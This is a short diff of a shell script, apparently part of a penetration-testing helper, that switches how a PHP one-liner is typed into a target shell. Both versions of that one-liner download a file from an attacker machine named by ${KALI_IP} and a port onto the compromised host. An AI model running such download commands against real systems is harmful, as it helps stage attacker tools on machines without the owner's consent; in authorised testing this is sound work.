@@ -16,5 +16,5 @@ SERVER_PORT=${form_data["server_port"]}
 SERVER_FILE=${form_data["server_file_location"]}
 LOCAL_FILE=${form_data["local_file_location"]}
 
-paste_command "php -r 'const BUFFER = 1024; \$fremote = fopen(\"${KALI_IP}:${PORT}/${SERVER_FILE}\", \"rb\"); \$flocal = fopen(\"${LOCAL_FILE}\", \"wb\"); while (\$buffer = fread(\$fremote, BUFFER)) { fwrite(\$flocal, \$buffer); } fclose(\$flocal); fclose(\$fremote);'"
-xdotool key Return
+execute_command "php -r 'const BUFFER = 1024; \$fremote = fopen(\"${KALI_IP}:${PORT}/${SERVER_FILE}\", \"rb\"); \$flocal = fopen(\"${LOCAL_FILE}\", \"wb\"); while (\$buffer = fread(\$fremote, BUFFER)) { fwrite(\$flocal, \$buffer); } fclose(\$flocal); fclose(\$fremote);'"
+create_new_line
